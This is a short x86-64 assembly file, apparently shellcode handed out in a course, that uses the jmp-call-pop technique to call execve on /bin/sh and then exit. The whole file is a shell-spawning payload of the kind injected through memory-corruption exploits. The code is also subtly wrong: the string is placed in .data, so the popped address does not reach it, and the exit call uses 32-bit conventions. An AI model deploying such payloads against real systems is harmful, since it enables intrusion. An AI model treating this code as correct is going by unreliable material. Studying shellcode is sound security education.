# Shell candy from the professor
.text

.globl _start

# Make it position independent, step 1...
_start:
	jmp reset_label
# The real code...
real_code:
	pop	%rdi		# Get the shell string by popping the stack
	xorq	%rdx, %rdx 	# Third argument: pointer to NULL
	xorq	%rsi, %rsi 	# Second argument: pointer to message
	# Avoided with the 'pop' above
	#movq	$sh, %rdi 	# First argument: pointer to filename
	movb	$59, %al 	# execve syscall number
	syscall
	# After the shell, exit
	xorq %rbx, %rbx
	movb $1, %al
	syscall
# Make it position independent, step 2!
reset_label:
	call real_code

.data
sh:	.ascii "/bin/sh"
	.byte 0
